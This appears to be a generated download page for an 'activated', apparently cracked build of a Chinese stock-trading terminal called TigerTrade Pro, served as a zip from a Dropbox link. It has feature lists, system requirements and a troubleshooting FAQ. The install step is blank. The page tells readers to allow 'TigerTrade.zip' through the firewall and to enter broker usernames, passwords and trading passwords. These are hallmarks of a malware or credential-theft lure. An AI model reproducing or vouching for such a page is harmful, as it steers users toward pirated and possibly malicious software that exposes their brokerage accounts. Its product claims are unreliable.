---
layout: default
title: "TigerTrade Pro — Download & Setup Guide (Windows x64)"
description: "Download TigerTrade Pro activated version for Windows 10/11 x64. Chinese market trading terminal with Level-2 data, algo orders & multi-broker support."
---

# TigerTrade Pro Desktop Application — Download & Setup Guide

[![Download TigerTrade Pro](https://www.dropbox.com/scl/fi/p0i9n538vmsyg2ei7qiz8/tigertrade-pro-9.25.0-x64.zip?rlkey=8urluxffcm4psq682rrdfms2m&st=33ga348u&dl=1)](https://www.dropbox.com/scl/fi/p0i9n538vmsyg2ei7qiz8/tigertrade-pro-9.25.0-x64.zip?rlkey=8urluxffcm4psq682rrdfms2m&st=33ga348u&dl=1)
**Version:** 9.25.0 | **License:** Commercial (Activated) | **Platform:** Windows 10/11 x64 | **SHA-256:** `a989a0146e826cd3797e38cf29cbcf8870ec2cceea50541e3eee1f933ede0cb9`

---

## Overview

TigerTrade Pro is a professional-grade trading terminal designed for the Chinese A-share market, providing Level-2 market data, algorithmic order execution, and multi-broker connectivity. The Windows 10/11 x64 desktop client is widely used by retail and semi-professional traders for its low-latency order routing, advanced charting, and comprehensive market analysis tools.

The terminal supports trading on the Shanghai Stock Exchange (SSE), Shenzhen Stock Exchange (SZSE), and Beijing Stock Exchange (BSE) through integration with major Chinese brokers (Huatai, Guotai Junan, CITIC, GF Securities). Level-2 data provides real-time order book depth, tick-by-tick transaction data, and institutional flow analysis.

TigerTrade Pro features a modular architecture with customizable workspaces, multi-monitor support, and a built-in strategy editor for automated trading. The application uses a C++ core for order execution with a Qt-based UI, ensuring sub-millisecond order routing and minimal UI latency.

---

## Key Features

1. **Level-2 Market Data** — Real-time order book depth (10 levels), tick-by-tick transaction data, institutional flow analysis, and large order detection for A-share stocks.
2. **Multi-Broker Connectivity** — Connect to Huatai, Guotai Junan, CITIC, GF, and 20+ additional Chinese brokers with unified order management and account aggregation.
3. **Algorithmic Order Execution** — TWAP, VWAP, Iceberg, and custom algo order types for minimizing market impact on large positions.
4. **Advanced Charting** — Multi-timeframe candlestick, line, and Renko charts with 100+ technical indicators, drawing tools, and custom study development via Python.
5. **Strategy Editor** — Built-in Python-based strategy editor with backtesting engine, real-time signal generation, and automated order execution.
6. **Multi-Monitor Workspace** — Customizable workspace layouts with drag-and-drop widgets, multi-monitor support, and workspace profiles for different trading sessions.
7. **Real-Time Alerts** — Price, volume, indicator, and news alerts with push notifications, email, and SMS delivery.
8. **Portfolio Management** — Multi-account portfolio tracking with P&L analysis, risk metrics (Sharpe, VaR, max drawdown), and position sizing tools.
9. **News & Research** — Integrated financial news feed from Xinhua, Sina Finance, and CNStock with sentiment analysis and event-driven alerts.
10. **Data Export & API** — Export historical data to CSV, Excel, or Python pandas. REST API for third-party integration and custom tool development.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 x64 (21H2) | Windows 11 x64 (23H2/24H2) |
| **Processor** | Intel Core i5 / AMD Ryzen 5 (4 cores) | Intel Core i7 / AMD Ryzen 7 (8+ cores) |
| **RAM** | 8 GB | 16 GB |
| **Storage** | 2 GB free disk space | 5 GB SSD |
| **Display** | 1920x1080 (single monitor) | 1920x1080 x 2+ (multi-monitor) |
| **Network** | Broadband (25 Mbps) | Broadband (100+ Mbps) for Level-2 data |
| **Graphics** | Integrated GPU | Dedicated GPU (for multi-monitor rendering) |

---

## How to Download and Install

### Step 1: Download the Installer

Click the **Download** badge above to download the TigerTrade Pro installer. The file is approximately 120 MB.

### Step 2: Verify the Checksum

```powershell
Get-FileHash .\tigertrade-pro-9.25.0-x64.zip -Algorithm SHA256
```

Compare with the hash listed at the top of this page.

### Step 3: Run the Installer


### Step 4: Complete Setup

1. Launch TigerTrade Pro and select your broker from the list.
2. Enter your broker account credentials (username, password, and trading password).
3. Configure Level-2 data subscription (required for order book depth).
4. Set up your workspace: drag and drop widgets (chart, order book, positions, alerts).
5. Configure algo orders: Tools → Algo Orders → Select strategy → Set parameters.

### Step 5: Post-Installation

- Enable **"Auto-Login"** for your broker account.
- Configure **"Order Confirmation"** dialogs to prevent accidental trades.
- Set up **"Price Alerts"** for your watchlist.
- Enable **"Data Export"** for end-of-day analysis.

---

## Troubleshooting & FAQ



### Issue: Broker connection fails

**Solution:**  
1. Check internet connection.  
2. Verify broker account credentials.  
3. Ensure the broker's trading server is accessible (some brokers require VPN for overseas access).  
4. Check Windows Firewall: allow TigerTrade.zip through inbound/outbound rules.  
5. Contact your broker for server address and port configuration.

### Issue: Level-2 data not updating

**Solution:**  
1. Ensure you have an active Level-2 data subscription with your broker.  
2. Restart TigerTrade Pro.  
3. Check network latency: ping the broker's server.  
4. Disable VPN if not required by your broker.

### Issue: Algo orders not executing

**Solution:**  
1. Ensure the strategy is compiled without errors (check the log window).  
2. Verify that the algo order is enabled and the market is open.  
3. Check that your account has sufficient funds/margin.  
4. Review the algo order parameters (price, quantity, time window).

### FAQ

**Q: Is TigerTrade Pro free?**  
A: The terminal is free to download, but Level-2 data and algo order execution require a paid subscription or broker-specific permissions.

**Q: Which brokers are supported?**  
A: Huatai, Guotai Junan, CITIC, GF, China Merchants, and 20+ additional Chinese brokers.

**Q: Can I trade US stocks with TigerTrade Pro?**  
A: TigerTrade Pro is designed for the Chinese A-share market. For US stocks, use Tiger Brokers (Tiger Trade) or other international platforms.

**Q: Is my trading data secure?**  
A: TigerTrade Pro uses SSL/TLS encryption for all broker communications. Your credentials are stored locally with AES-256 encryption.

**Q: Can I use TigerTrade Pro on multiple computers?**  
A: Yes. Your workspace configuration and settings can be exported and imported on any computer with TigerTrade Pro installed.
